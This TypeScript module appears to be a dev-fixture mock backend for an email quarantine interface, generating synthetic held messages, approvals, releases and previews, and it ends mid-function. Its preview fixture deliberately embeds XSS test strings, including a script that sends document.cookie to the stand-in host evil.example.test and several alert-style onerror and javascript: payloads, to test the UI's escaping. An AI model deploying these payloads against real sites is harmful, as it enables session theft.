import 'server-only';
import type { ListItem, SuccessBody } from '@/lib/api/types';
import { SeededRandom, stableUuid } from '../generator';
import {
  apiError,
  ok,
  type FixtureHandlers,
  type FixtureRequest,
  type FixtureResponse,
} from '../types';
import { FIXTURE_MESSAGES, fixtureGuard } from './messages';
import { resolveFixturePrincipal } from './session';

export { DEV_MOCK_MARKER } from '../types';

/**
 * Dev fixtures of the quarantine pages (WP5), with state on globalThis (shared by the separately
 * bundled BFF route handlers of `next dev`): per-recipient entries tied to the message fixtures,
 * filter-bound v0 cursors (`items`), the summary, catalog, detail with `allowedActions` per caller,
 * history, a sanitized preview with hostile text, download grants and the single-use download,
 * release / request release / reject / delete / bulk with required Idempotency-Key (replays
 * answered with `Idempotency-Replayed: true`), approvals with separation of duties, a release
 * executor that completes a queued release about 15 seconds later, settings and self-service.
 * Everything is synthetic.
 */

type Detail = SuccessBody<'QuarantineEntriesController_detail_v1'>;
type Summary = ListItem<'QuarantineEntriesController_search_v1'>;
type Approval = SuccessBody<'QuarantineApprovalsController_get_v1'>;
type Release = SuccessBody<'QuarantineToolsController_release_v1'>;
type HistoryAction = SuccessBody<'QuarantineEntriesController_history_v1'>['actions'][number];
type Settings = SuccessBody<'QuarantineToolsController_getSettings_v1'>;
type Raw = NonNullable<Settings['raw']>;
type ApprovalReason = Approval['approvalReasons'][number];

interface EntryRecord {
  detail: Omit<Detail, 'allowedActions'>;
  history: HistoryAction[];
  legalHold: boolean;
}
interface ApprovalRecord {
  approval: Approval;
  requesterRole: string | null;
}
interface ReleaseRecord {
  release: Release;
  requestedAtMs: number;
}
interface QuarantineState {
  entries: Map<string, EntryRecord>;
  approvals: Map<string, ApprovalRecord>;
  releases: Map<string, ReleaseRecord>;
  raw: Raw;
  rowVersion: number;
  preferences: Map<string, boolean>;
  grants: Map<string, { entryId: string; role: string; used: boolean; expiresAt: number }>;
  idempotency: Map<string, { fingerprint: string; response: FixtureResponse }>;
}

const HOUR = 3_600_000;
const DAY = 24 * HOUR;
const EXECUTOR_DELAY_MS = 15_000;
const sha = (seed: string) =>
  Array.from({ length: 2 }, (_, i) => stableUuid(`${seed}:${i}`).replace(/-/g, ''))
    .join('')
    .slice(0, 64);

const DEFAULTS: Settings['effective'] = {
  review: { days: 7 },
  approvals: { requestTtlHours: 72 },
  release: { allowHardBlocks: true },
  endUser: {
    enabled: true,
    preview: true,
    selfRelease: true,
    selfReleaseReasons: ['spam', 'bulk'],
    selfReleaseMaxLevel: 'low',
    requestRelease: true,
  },
  digest: { allowOptOut: true, includeSubject: true, maxEntries: 50 },
  alerts: { approvalRequests: true, hardBlocks: true, minIntervalMinutes: 60 },
  notices: { senderOnReject: true },
  download: { enabled: false },
  hold: { days: 30 },
  digestSchedule: { enabled: true, schedule: 'daily 08:00', timeZone: 'Europe/Berlin' },
};
const BOUNDS: Settings['bounds'] = {
  maxHoldDays: 90,
  maxReviewDays: 13,
  requestTtlHours: { min: 1, max: 168 },
  digestMaxEntries: { min: 1, max: 200 },
  alertMinIntervalMinutes: { min: 15, max: 1440 },
};
const LIMITS: SuccessBody<'QuarantineToolsController_catalog_v1'>['limits'] = {
  searchMaxRangeDays: 31,
  searchMaxPageSize: 100,
  searchDefaultPageSize: 25,
  bulkMaxItems: 100,
  bulkMaxItemsPerMinute: 1000,
  previewMaxTextChars: 100_000,
  downloadTokenTtlSeconds: 60,
  downloadMaxBytes: 26_214_400,
  reasonMaxChars: 512,
};

const REASON_OF: Record<string, Detail['reason']> = {
  spam: 'spam',
  bulk: 'bulk',
  phishing: 'phishing',
  malware: 'malware',
  bec: 'bec',
  suspicious: 'suspicious',
  dlp_violation: 'dlp',
};
const ENGINE_OF: Record<string, Detail['primaryEngine']> = {
  spam: 'rspamd',
  bulk: 'rspamd',
  phishing: 'url',
  malware: 'attachment',
  bec: 'bec',
  dlp: 'dlp',
  suspicious: 'rspamd',
  policy: 'policy',
  manual: 'none',
};

function levelOf(score: number | null): Detail['riskLevel'] {
  if (score === null) return null;
  if (score >= 800) return 'critical';
  if (score >= 600) return 'high';
  if (score >= 300) return 'medium';
  if (score >= 100) return 'low';
  return 'none';
}

function buildState(): QuarantineState {
  const random = new SeededRandom('quarantine-fixtures');
  const entries = new Map<string, EntryRecord>();
  const approvals = new Map<string, ApprovalRecord>();
  const releases = new Map<string, ReleaseRecord>();
  let n = 0;
  // Self-service owners in fixture mode: the dev users `mailbox_user@example.com` (only
  // quarantine:self) and `organization_admin@example.com` get their own held entries.
  const selfOwners = [
    'mailbox_user@example.com',
    'mailbox_user@example.com',
    'mailbox_user@example.com',
    'mailbox_user@example.com',
    'organization_admin@example.com',
  ];
  for (const message of FIXTURE_MESSAGES) {
    const d = message.detail;
    const held = d.status === 'quarantined' || d.status === 'held_for_review';
    if (!held && !(n % 7 === 0 && d.finalVerdict === 'spam')) continue;
    const recipients =
      d.status === 'quarantined' && selfOwners.length > 0
        ? [...message.recipients, selfOwners.shift() ?? 'mailbox_user@example.com']
        : message.recipients;
    recipients.forEach((recipient, rcpt) => {
      n += 1;
      const id = stableUuid(`qentry:${d.id}:${rcpt}`);
      const review = d.status === 'held_for_review';
      const reason = REASON_OF[d.finalVerdict ?? ''] ?? 'policy';
      const hardBlocks = d.finalVerdict === 'malware' ? ['hb.malware_attachment'] : [];
      const quarantinedAt = new Date(Date.parse(d.receivedAt) + 5_000).toISOString();
      // A spread of states for the UI: most held, some decided already.
      const state: Detail['state'] = review
        ? 'pending_approval'
        : n % 11 === 0
          ? 'released'
          : n % 13 === 0
            ? 'rejected'
            : n % 17 === 0
              ? 'deleted'
              : n % 19 === 0
                ? 'expired'
                : 'held';
      const approvalId = review ? stableUuid(`qapproval:${id}`) : null;
      const detail: EntryRecord['detail'] = {
        id,
        messageId: d.id,
        lifecycleRound: d.lifecycleRound,
        state,
        kind: review ? 'review' : 'quarantine',
        origin: n % 23 === 0 ? 'manual' : 'policy',
        reason,
        direction: d.direction,
        recipient,
        sender: { envelope: d.envelopeFrom, headerFrom: d.headerFrom },
        subject: d.subject,
        receivedAt: d.receivedAt,
        quarantinedAt,
        expiresAt: new Date(Date.parse(quarantinedAt) + (review ? 7 : 30) * DAY).toISOString(),
        riskLevel: levelOf(d.riskScore),
        riskScore: d.riskScore,
        hardBlocks,
        primaryEngine: ENGINE_OF[reason] ?? 'policy',
        decisive: {
          source: 'tenant_rule',
          policyId: stableUuid('policy:inbound-threats'),
          versionNo: 3,
          ruleId: 'block-high-risk',
        },
        hasAttachments: d.attachmentCount > 0,
        attachmentCount: d.attachmentCount,
        sizeBytes: d.sizeBytes,
        approvalRequestId: approvalId,
        rowVersion: random.int(1, 4),
        explanation: {
          lines: [],
          text: review
            ? 'The policy requires approval: rule block-high-risk of policy inbound-threats (v3) decided require_approval.'
            : `Quarantined by rule block-high-risk of policy inbound-threats (v3): verdict ${d.finalVerdict ?? 'unknown'}, risk ${d.riskScore ?? 'not scored'}.`,
        },
        floorReasons: hardBlocks.length > 0 ? ['policy.floor.hard_block'] : [],
        reasonCodes: ['policy.rule.matched', ...(hardBlocks.length > 0 ? ['risk.hard_block'] : [])],
        releases: [],
        contentAvailable: state !== 'deleted',
      };
      entries.set(id, {
        detail,
        legalHold: n % 29 === 0,
        history: [
          {
            action: 'quarantine',
            actor: { type: 'system', id: null },
            result: state === 'pending_approval' ? 'pending_approval' : 'held',
            reason: null,
            at: quarantinedAt,
          },
          ...(state === 'rejected'
            ? [
                {
                  action: 'reject',
                  actor: { type: 'user' as const, id: stableUuid('user:analyst') },
                  result: 'rejected',
                  reason: 'Confirmed phishing <script>alert(1)</script>',
                  at: new Date(Date.parse(quarantinedAt) + HOUR).toISOString(),
                },
              ]
            : []),
        ],
      });
      if (approvalId) {
        approvals.set(approvalId, {
          requesterRole: null,
          approval: {
            id: approvalId,
            kind: 'policy_review',
            status: 'pending',
            entryId: id,
            approvalReasons: ['review'],
            requestedBy: { type: 'system', id: null },
            requestedAt: quarantinedAt,
            expiresAt: detail.expiresAt,
            decidedBy: null,
            decidedAt: null,
            decisionReason: null,
          },
        });
      }
      if (state === 'released') {
        const releaseId = stableUuid(`qrelease:${id}`);
        const release: Release = {
          id: releaseId,
          status: 'dispatched',
          mode: 'operator',
          requestedBy: { type: 'user', id: stableUuid('user:analyst') },
          requestedAt: new Date(Date.parse(quarantinedAt) + 2 * HOUR).toISOString(),
          completedAt: new Date(Date.parse(quarantinedAt) + 2 * HOUR + 20_000).toISOString(),
          revalidation: revalidationOf(detail),
          deliveredObject: 'policy_copy',
          approvalRequestId: null,
          entryIds: [id],
        };
        releases.set(releaseId, { release, requestedAtMs: Date.parse(release.requestedAt) });
        detail.releases.push(summaryOfRelease(release));
      }
    });
  }
  // Decided approvals for the history views.
  const decided = [...entries.values()].filter((e) => e.detail.state === 'released').slice(0, 4);
  decided.forEach((entry, i) => {
    const id = stableUuid(`qapproval:decided:${i}`);
    approvals.set(id, {
      requesterRole: 'quarantine_reviewer',
      approval: {
        id,
        kind: i % 2 === 0 ? 'release_request' : 'release_approval',
        status: i === 3 ? 'denied' : 'approved',
        entryId: entry.detail.id,
        approvalReasons: i % 2 === 0 ? [] : ['hard_block'],
        requestedBy: { type: 'user', id: stableUuid('user:reviewer') },
        requestedAt: new Date(Date.parse(entry.detail.quarantinedAt) + HOUR).toISOString(),
        expiresAt: new Date(Date.parse(entry.detail.quarantinedAt) + 73 * HOUR).toISOString(),
        decidedBy: stableUuid('user:admin'),
        decidedAt: new Date(Date.parse(entry.detail.quarantinedAt) + 2 * HOUR).toISOString(),
        decisionReason: i === 3 ? 'Sender not recognised' : 'Verified with the sender by phone',
      },
    });
  });
  return {
    entries,
    approvals,
    releases,
    raw: { endUser: { selfRelease: true } },
    rowVersion: 3,
    preferences: new Map(),
    grants: new Map(),
    idempotency: new Map(),
  };
}

const globalState = globalThis as typeof globalThis & {
  __egDevFixtureQuarantine?: QuarantineState;
};
function state(): QuarantineState {
  globalState.__egDevFixtureQuarantine ??= buildState();
  return globalState.__egDevFixtureQuarantine;
}

function effective(): Settings['effective'] {
  const raw = state().raw;
  return {
    ...DEFAULTS,
    review: { ...DEFAULTS.review, ...raw.review },
    approvals: { ...DEFAULTS.approvals, ...raw.approvals },
    release: { ...DEFAULTS.release, ...raw.release },
    endUser: { ...DEFAULTS.endUser, ...raw.endUser },
    digest: { ...DEFAULTS.digest, ...raw.digest },
    alerts: { ...DEFAULTS.alerts, ...raw.alerts },
    notices: { ...DEFAULTS.notices, ...raw.notices },
    download: { ...DEFAULTS.download, ...raw.download },
  };
}

function revalidationOf(detail: EntryRecord['detail']): NonNullable<Release['revalidation']> {
  return {
    disposition: 'quarantine',
    source: 'tenant_rule',
    decisiveRuleRef: 'pol-inbound-threats/3#block-high-risk',
    floorReasons: detail.floorReasons,
    hardBlocks: detail.hardBlocks,
    level: detail.riskLevel,
    score: detail.riskScore,
    recommendedAction: 'quarantine',
    generation: '42',
    snapshotSha256: sha(`snap:${detail.id}`),
    inputSha256: sha(`input:${detail.id}`),
    evaluatorVersion: 'policy-eval/2',
    scanId: String(900_000 + detail.lifecycleRound),
    scanCompletedAt: new Date(Date.parse(detail.receivedAt) + 2_400).toISOString(),
  };
}

function summaryOfRelease(release: Release): Detail['releases'][number] {
  const { entryIds, ...rest } = release;
  void entryIds;
  return rest;
}

/** The release executor: a queued release completes about 15 s after it was requested. */
function runExecutor(now = Date.now()): void {
  const s = state();
  for (const record of s.releases.values()) {
    if (record.release.status !== 'pending' || now - record.requestedAtMs < EXECUTOR_DELAY_MS)
      continue;
    record.release.status = 'dispatched';
    record.release.completedAt = new Date(now).toISOString();
    record.release.deliveredObject = 'policy_copy';
    for (const entryId of record.release.entryIds) {
      const entry = s.entries.get(entryId);
      if (!entry) continue;
      record.release.revalidation = revalidationOf(entry.detail);
      entry.detail.state = 'released';
      entry.detail.rowVersion += 1;
      entry.detail.releases = entry.detail.releases.map((r) =>
        r.id === record.release.id ? summaryOfRelease(record.release) : r,
      );
      entry.history.push({
        action: 'release',
        actor: { type: 'system', id: null },
        result: 'dispatched',
        reason: null,
        at: new Date(now).toISOString(),
      });
    }
  }
}

function principalOf(request: FixtureRequest) {
  return resolveFixturePrincipal(request.token);
}

function has(request: FixtureRequest, permission: string): boolean {
  return principalOf(request)?.permissions.includes(permission) ?? false;
}

function selfAddress(request: FixtureRequest): string {
  return `${principalOf(request)?.role ?? 'unknown'}@example.com`;
}

const LEVEL_ORDER = ['none', 'low', 'medium', 'high', 'critical'];

function allowedActions(record: EntryRecord, request: FixtureRequest): Detail['allowedActions'] {
  const d = record.detail;
  const out: Detail['allowedActions'] = [];
  const open = d.state === 'held' || d.state === 'pending_approval';
  if (has(request, 'quarantine:preview') && d.contentAvailable) out.push('preview');
  if (has(request, 'quarantine:release') && d.state === 'held') out.push('release');
  if (has(request, 'quarantine:request_release') && d.state === 'held') out.push('request_release');
  if (has(request, 'quarantine:reject') && open) out.push('reject');
  if (
    has(request, 'quarantine:delete') &&
    (open || d.state === 'rejected' || d.state === 'expired')
  )
    out.push('delete');
  if (
    has(request, 'quarantine:download') &&
    effective().download.enabled &&
    d.contentAvailable &&
    d.hardBlocks.length === 0 &&
    d.reason !== 'malware' &&
    d.reason !== 'phishing'
  ) {
    out.push('download');
  }
  return out;
}

function selfAllowed(record: EntryRecord): Detail['allowedActions'] {
  const d = record.detail;
  const e = effective().endUser;
  const out: Detail['allowedActions'] = [];
  const dangerous = d.hardBlocks.length > 0 || d.reason === 'malware' || d.reason === 'phishing';
  if (e.preview && !dangerous && d.contentAvailable) out.push('preview');
  if (
    e.selfRelease &&
    d.state === 'held' &&
    !dangerous &&
    (e.selfReleaseReasons as readonly string[]).includes(d.reason) &&
    LEVEL_ORDER.indexOf(d.riskLevel ?? 'none') <= LEVEL_ORDER.indexOf(e.selfReleaseMaxLevel)
  ) {
    out.push('release');
  }
  if (e.requestRelease && d.state === 'held') out.push('request_release');
  return out;
}

function detailFor(record: EntryRecord, request: FixtureRequest): Detail {
  return {
    ...record.detail,
    subject: has(request, 'quarantine:preview') ? record.detail.subject : null,
    allowedActions: allowedActions(record, request),
  };
}

function summaryFor(record: EntryRecord, request: FixtureRequest, self = false): Summary {
  const { explanation, floorReasons, reasonCodes, releases, contentAvailable, ...summary } =
    record.detail;
  void explanation;
  void floorReasons;
  void reasonCodes;
  void releases;
  void contentAvailable;
  return {
    ...summary,
    subject: self || has(request, 'quarantine:preview') ? summary.subject : null,
  };
}

/** Idempotency-Key handling (required): replays return the stored response. */
function idempotent(request: FixtureRequest, handler: () => FixtureResponse): FixtureResponse {
  const key = request.headers.get('idempotency-key');
  if (!key)
    return apiError(400, 'idempotency_key_required', 'The Idempotency-Key header is required');
  const s = state();
  const scoped = `${principalOf(request)?.role}:${key}`;
  const fingerprint = JSON.stringify([request.operationId, request.params, request.body]);
  const stored = s.idempotency.get(scoped);
  if (stored) {
    if (stored.fingerprint !== fingerprint) {
      return apiError(
        422,
        'idempotency_key_reused',
        'The Idempotency-Key was used for another request',
      );
    }
    return {
      ...stored.response,
      headers: { ...(stored.response.headers ?? {}), 'idempotency-replayed': 'true' },
    };
  }
  const response = handler();
  if (response.status >= 200 && response.status < 300)
    s.idempotency.set(scoped, { fingerprint, response });
  return response;
}

function bodyOf(request: FixtureRequest): Record<string, unknown> {
  return request.body && typeof request.body === 'object'
    ? (request.body as Record<string, unknown>)
    : {};
}

function reasonError(body: Record<string, unknown>): FixtureResponse | null {
  const reason = body.reason;
  if (typeof reason !== 'string' || reason.trim().length === 0 || reason.length > 512) {
    return apiError(400, 'validation_failed', ['reason: must be 1 to 512 characters']);
  }
  return null;
}

function versionError(record: EntryRecord, body: Record<string, unknown>): FixtureResponse | null {
  const expected = body.expectedRowVersion;
  if (typeof expected === 'number' && expected !== record.detail.rowVersion) {
    return apiError(409, 'quarantine_version_conflict', 'The entry changed', {
      currentRowVersion: record.detail.rowVersion,
    });
  }
  return null;
}

function actor(request: FixtureRequest): HistoryAction['actor'] {
  return { type: 'user', id: stableUuid(`user:${principalOf(request)?.role ?? 'unknown'}`) };
}

function createApproval(
  record: EntryRecord,
  request: FixtureRequest,
  kind: Approval['kind'],
  reasons: ApprovalReason[],
): Approval {
  const id = stableUuid(`qapproval:${record.detail.id}:${Date.now()}`);
  const approval: Approval = {
    id,
    kind,
    status: 'pending',
    entryId: record.detail.id,
    approvalReasons: reasons,
    requestedBy: actor(request),
    requestedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + effective().approvals.requestTtlHours * HOUR).toISOString(),
    decidedBy: null,
    decidedAt: null,
    decisionReason: null,
  };
  state().approvals.set(id, { approval, requesterRole: principalOf(request)?.role ?? null });
  record.detail.state = 'pending_approval';
  record.detail.approvalRequestId = id;
  record.detail.rowVersion += 1;
  return approval;
}

function queueRelease(
  record: EntryRecord,
  request: FixtureRequest,
  mode: Release['mode'],
  approvalRequestId: string | null,
): Release {
  const id = stableUuid(`qrelease:${record.detail.id}:${Date.now()}`);
  const release: Release = {
    id,
    status: 'pending',
    mode,
    requestedBy: actor(request),
    requestedAt: new Date().toISOString(),
    completedAt: null,
    revalidation: null,
    deliveredObject: null,
    approvalRequestId,
    entryIds: [record.detail.id],
  };
  state().releases.set(id, { release, requestedAtMs: Date.now() });
  record.detail.state = 'releasing';
  record.detail.rowVersion += 1;
  record.detail.releases = [...record.detail.releases, summaryOfRelease(release)];
  return release;
}

/** The single-item release rules (also used by bulk). */
function doRelease(record: EntryRecord, request: FixtureRequest, reason: string): FixtureResponse {
  const d = record.detail;
  if (d.state !== 'held')
    return apiError(409, 'quarantine_state_conflict', `The entry is ${d.state}`);
  if (d.hardBlocks.length > 0 && !effective().release.allowHardBlocks) {
    return apiError(
      409,
      'quarantine_hard_block_release_disabled',
      'Hard-blocked entries cannot be released',
    );
  }
  if (d.lifecycleRound > 0 && d.reason === 'phishing') {
    return apiError(409, 'quarantine_rescan_required', 'The verdict is stale', {
      staleness: 'verdict_age',
    });
  }
  record.history.push({
    action: 'release',
    actor: actor(request),
    result: 'requested',
    reason,
    at: new Date().toISOString(),
  });
  const reasons: ApprovalReason[] = [
    ...(d.hardBlocks.length > 0 ? (['hard_block'] as const) : []),
    ...(d.kind === 'review' ? (['review'] as const) : []),
  ];
  if (reasons.length > 0) {
    const approval = createApproval(record, request, 'release_approval', reasons);
    return ok(
      'QuarantineEntriesController_release_v1',
      {
        outcome: 'approval_requested',
        entryId: d.id,
        state: 'pending_approval',
        approvalRequestId: approval.id,
        approvalReasons: reasons,
        rowVersion: d.rowVersion,
      },
      202,
    );
  }
  const release = queueRelease(record, request, 'operator', null);
  return ok(
    'QuarantineEntriesController_release_v1',
    {
      outcome: 'queued',
      entryId: d.id,
      state: 'releasing',
      releaseId: release.id,
      rowVersion: d.rowVersion,
    },
    202,
  );
}

function doReject(record: EntryRecord, request: FixtureRequest, reason: string): FixtureResponse {
  const d = record.detail;
  if (d.state !== 'held' && d.state !== 'pending_approval') {
    return apiError(409, 'quarantine_state_conflict', `The entry is ${d.state}`);
  }
  if (d.approvalRequestId) {
    const pending = state().approvals.get(d.approvalRequestId);
    if (pending?.approval.status === 'pending') pending.approval.status = 'cancelled';
  }
  d.state = 'rejected';
  d.rowVersion += 1;
  record.history.push({
    action: 'reject',
    actor: actor(request),
    result: 'rejected',
    reason,
    at: new Date().toISOString(),
  });
  return ok('QuarantineEntriesController_reject_v1', {
    entryId: d.id,
    state: 'rejected',
    rowVersion: d.rowVersion,
    messageTransition: null,
    purge: 'pending',
  });
}

function doDelete(record: EntryRecord, request: FixtureRequest, reason: string): FixtureResponse {
  const d = record.detail;
  if (!['held', 'pending_approval', 'rejected', 'expired'].includes(d.state)) {
    return apiError(409, 'quarantine_state_conflict', `The entry is ${d.state}`);
  }
  if (record.legalHold) {
    return apiError(409, 'quarantine_legal_hold', 'The message is under legal hold', {
      legalHoldId: stableUuid('legal-hold:1'),
    });
  }
  d.state = 'deleted';
  d.contentAvailable = false;
  d.rowVersion += 1;
  record.history.push({
    action: 'delete',
    actor: actor(request),
    result: 'deleted',
    reason,
    at: new Date().toISOString(),
  });
  return ok('QuarantineEntriesController_delete_v1', {
    entryId: d.id,
    state: 'deleted',
    rowVersion: d.rowVersion,
    messageTransition: null,
    purge: d.recipient.endsWith('@alpha.example.test') ? 'pending' : 'retained',
  });
}

/** Separation of duties and state of an approval decision. */
function decisionError(record: ApprovalRecord, request: FixtureRequest): FixtureResponse | null {
  const role = principalOf(request)?.role;
  if (record.approval.status !== 'pending') {
    return apiError(409, 'quarantine_approval_not_pending', 'The approval request is not pending');
  }
  if (record.requesterRole && record.requesterRole === role) {
    return apiError(
      403,
      'quarantine_approval_forbidden',
      'The requester cannot decide the request',
      { reason: 'requester' },
    );
  }
  const entry = state().entries.get(record.approval.entryId);
  if (entry && entry.detail.recipient === `${role}@example.com`) {
    return apiError(
      403,
      'quarantine_approval_forbidden',
      'The recipient cannot decide the request',
      { reason: 'recipient' },
    );
  }
  return null;
}

function doApprove(
  record: ApprovalRecord,
  request: FixtureRequest,
  reason: string,
): FixtureResponse {
  const error = decisionError(record, request);
  if (error) return error;
  const entry = state().entries.get(record.approval.entryId);
  if (!entry) return apiError(404, 'quarantine_entry_not_found', 'Entry not found');
  record.approval.status = 'approved';
  record.approval.decidedBy = actor(request).id;
  record.approval.decidedAt = new Date().toISOString();
  record.approval.decisionReason = reason;
  entry.detail.state = 'held';
  const release = queueRelease(entry, request, 'approved', record.approval.id);
  entry.history.push({
    action: 'approve',
    actor: actor(request),
    result: 'approved',
    reason,
    at: new Date().toISOString(),
  });
  return ok(
    'QuarantineApprovalsController_approve_v1',
    {
      approvalRequestId: record.approval.id,
      status: 'approved',
      entryId: entry.detail.id,
      entryState: 'releasing',
      releaseId: release.id,
      messageTransition: null,
    },
    202,
  );
}

function doDeny(record: ApprovalRecord, request: FixtureRequest, reason: string): FixtureResponse {
  const error = decisionError(record, request);
  if (error) return error;
  const entry = state().entries.get(record.approval.entryId);
  if (!entry) return apiError(404, 'quarantine_entry_not_found', 'Entry not found');
  record.approval.status = 'denied';
  record.approval.decidedBy = actor(request).id;
  record.approval.decidedAt = new Date().toISOString();
  record.approval.decisionReason = reason;
  entry.detail.state = record.approval.kind === 'policy_review' ? 'rejected' : 'held';
  entry.detail.rowVersion += 1;
  entry.history.push({
    action: 'deny',
    actor: actor(request),
    result: entry.detail.state,
    reason,
    at: new Date().toISOString(),
  });
  return ok('QuarantineApprovalsController_deny_v1', {
    approvalRequestId: record.approval.id,
    status: 'denied',
    entryId: entry.detail.id,
    entryState: entry.detail.state,
    releaseId: null,
    messageTransition: null,
  });
}

function cursorOf(query: URLSearchParams, filters: string): number | null {
  const cursor = query.get('cursor');
  if (!cursor) return 0;
  try {
    const parsed = JSON.parse(Buffer.from(cursor, 'base64url').toString('utf8')) as {
      o?: unknown;
      f?: unknown;
    };
    return typeof parsed.o === 'number' && parsed.f === filters ? parsed.o : null;
  } catch {
    return null;
  }
}

function pageOf<T>(items: readonly T[], query: URLSearchParams, filters: string, invalid: string) {
  const offset = cursorOf(query, filters);
  if (offset === null)
    return {
      error: apiError(400, invalid, 'The cursor is invalid for these filters; restart the search'),
    };
  const limit = Math.min(
    LIMITS.searchMaxPageSize,
    Math.max(1, Number(query.get('limit') ?? LIMITS.searchDefaultPageSize) || 25),
  );
  const page = items.slice(offset, offset + limit);
  const nextCursor =
    offset + limit < items.length
      ? Buffer.from(JSON.stringify({ o: offset + limit, f: filters })).toString('base64url')
      : null;
  return { page, nextCursor };
}

function rangeOf(query: URLSearchParams): { from: number; to: number } | FixtureResponse {
  const from = Date.parse(query.get('from') ?? '');
  const to = Date.parse(query.get('to') ?? '');
  if (!Number.isFinite(from) || !Number.isFinite(to) || to <= from) {
    return apiError(
      400,
      'quarantine_search_range_invalid',
      'from and to are required, from before to',
    );
  }
  if (to - from > LIMITS.searchMaxRangeDays * DAY) {
    return apiError(
      400,
      'quarantine_search_range_invalid',
      `The range is at most ${LIMITS.searchMaxRangeDays} days`,
    );
  }
  return { from, to };
}

const filterHash = (query: URLSearchParams) =>
  JSON.stringify([...query.entries()].filter(([k]) => k !== 'cursor' && k !== 'limit').sort());

const listParam = (query: URLSearchParams, name: string) => {
  const value = query.get(name);
  return value ? value.split(',') : null;
};

function searchEntries(
  request: FixtureRequest,
  records: EntryRecord[],
  self: boolean,
): FixtureResponse {
  runExecutor();
  const q = request.query;
  const range = rangeOf(q);
  if ('status' in range) return range;
  const states = listParam(q, 'state');
  const reasons = listParam(q, 'reason');
  const levels = listParam(q, 'riskLevel');
  const engines = listParam(q, 'primaryEngine');
  const min = q.get('minRiskLevel');
  const eq = (name: string, value: string | null) => {
    const wanted = q.get(name);
    return !wanted || (value ?? '').toLowerCase() === wanted.toLowerCase();
  };
  const matches = records
    .filter(({ detail: d }) => {
      const t = Date.parse(d.quarantinedAt);
      return (
        t >= range.from &&
        t < range.to &&
        (!states || states.includes(d.state)) &&
        (!reasons || reasons.includes(d.reason)) &&
        (!levels || levels.includes(d.riskLevel ?? 'none')) &&
        (!engines || engines.includes(d.primaryEngine)) &&
        (!min || LEVEL_ORDER.indexOf(d.riskLevel ?? 'none') >= LEVEL_ORDER.indexOf(min)) &&
        eq('kind', d.kind) &&
        eq('direction', d.direction) &&
        eq('policyId', d.decisive.policyId) &&
        eq('ruleId', d.decisive.ruleId) &&
        eq('sender', d.sender.envelope) &&
        eq('headerFrom', d.sender.headerFrom) &&
        eq('senderDomain', d.sender.envelope?.split('@')[1] ?? null) &&
        eq('recipient', d.recipient) &&
        eq('messageId', d.messageId) &&
        (!q.get('hasAttachments') || String(d.hasAttachments) === q.get('hasAttachments')) &&
        (!q.get('hasHardBlock') || String(d.hardBlocks.length > 0) === q.get('hasHardBlock'))
      );
    })
    .sort((a, b) => b.detail.quarantinedAt.localeCompare(a.detail.quarantinedAt));
  const result = pageOf(matches, q, filterHash(q), 'quarantine_cursor_invalid');
  if ('error' in result)
    return result.error ?? apiError(400, 'quarantine_cursor_invalid', 'Invalid cursor');
  const items = result.page.map((record) => summaryFor(record, request, self));
  return {
    status: 200,
    body: { items, nextCursor: result.nextCursor },
    headers: { 'cache-control': 'no-store' },
  };
}

function withEntry(
  handler: (record: EntryRecord, request: FixtureRequest) => FixtureResponse,
  self = false,
) {
  return (request: FixtureRequest): FixtureResponse => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    runExecutor();
    const record = state().entries.get(request.params.entryId ?? '');
    if (!record || (self && record.detail.recipient !== selfAddress(request))) {
      return apiError(404, 'quarantine_entry_not_found', 'Quarantine entry not found');
    }
    return handler(record, request);
  };
}

function withApproval(
  handler: (record: ApprovalRecord, request: FixtureRequest) => FixtureResponse,
) {
  return (request: FixtureRequest): FixtureResponse => {
    const denied = fixtureGuard(request);
    if (denied) return denied;
    const record = state().approvals.get(request.params.approvalId ?? '');
    if (!record)
      return apiError(404, 'quarantine_approval_not_found', 'Approval request not found');
    return handler(record, request);
  };
}

function previewOf(record: EntryRecord): SuccessBody<'QuarantineEntriesController_preview_v1'> {
  const d = record.detail;
  return {
    version: 'preview/1',
    subject: d.subject,
    headers: [
      { name: 'From', value: d.sender.headerFrom ?? d.sender.envelope ?? '' },
      { name: 'To', value: d.recipient },
      { name: 'Subject', value: d.subject ?? '' },
      { name: 'X-Mailer', value: '<script>alert("header")</script> Mailer 1.0' },
    ],
    body: {
      source: 'html',
      text: [
        'Dear customer,',
        '',
        'Your account will be suspended. Verify now [link 1] or open the attached invoice.',
        '<script>document.location="https://evil.example.test/?c="+document.cookie</script>',
        '<img src=x onerror=alert(1)> <iframe src="javascript:alert(2)"></iframe>',
        'Card on file: 4111 11•• •••• 1111. Reference: ••••••••',
        '',
        `${'Lorem ipsum dolor sit amet, consectetur adipiscing elit. '.repeat(20)}`,
        'Regards,',
        'Accounts team',
      ].join('\n'),
      truncated: false,
      unavailableReason: null,
    },
    links: [
      {
        n: 1,
        displayUrl: 'hxxps://login[.]micr0soft-example[.]example[.]test/verify?u=<b>x</b>',
        host: 'login[.]micr0soft-example[.]example[.]test',
        verdict: 'malicious',
      },
      {
        n: 2,
        displayUrl: 'hxxps://cdn[.]example[.]test/unsubscribe',
        host: 'cdn[.]example[.]test',
        verdict: 'clean',
      },
    ],
    linksTruncated: false,
    attachments: d.hasAttachments
      ? Array.from({ length: d.attachmentCount }, (_, i) => ({
          partIndex: i + 2,
          filename: i === 0 ? 'invoice<script>.pdf' : `scan-${i}.pdf`,
          declaredType: 'application/pdf',
          detectedType:
            d.reason === 'malware' && i === 0 ? 'application/x-dosexec' : 'application/pdf',
          typeFamily: d.reason === 'malware' && i === 0 ? 'executable' : 'document',
          sizeBytes: 48_000 + i * 1000,
          sha256: sha(`${d.id}:att:${i}`),
          verdict: d.reason === 'malware' && i === 0 ? 'malicious' : 'clean',
          reasonCodes: d.reason === 'malware' && i === 0 ? ['malware.clamav'] : [],
          downloadable:
            !(d.reason === 'malware' || d.reason === 'phishing') && d.hardBlocks.length === 0,
        }))
      : [],
    dlp: { masked: 2, categories: ['payment_card', 'financial'] },
  };
}

function validateSettings(settings: unknown): { path: string; code: string; message: string }[] {
  const violations: { path: string; code: string; message: string }[] = [];
  if (!settings || typeof settings !== 'object')
    return [{ path: 'settings', code: 'invalid', message: 'must be an object' }];
  const s = settings as Record<string, Record<string, unknown>>;
  const intIn = (group: string, key: string, min: number, max: number) => {
    const value = s[group]?.[key];
    if (
      value !== undefined &&
      (typeof value !== 'number' || !Number.isInteger(value) || value < min || value > max)
    ) {
      violations.push({
        path: `${group}.${key}`,
        code: 'out_of_bounds',
        message: `must be an integer from ${min} to ${max}`,
      });
    }
  };
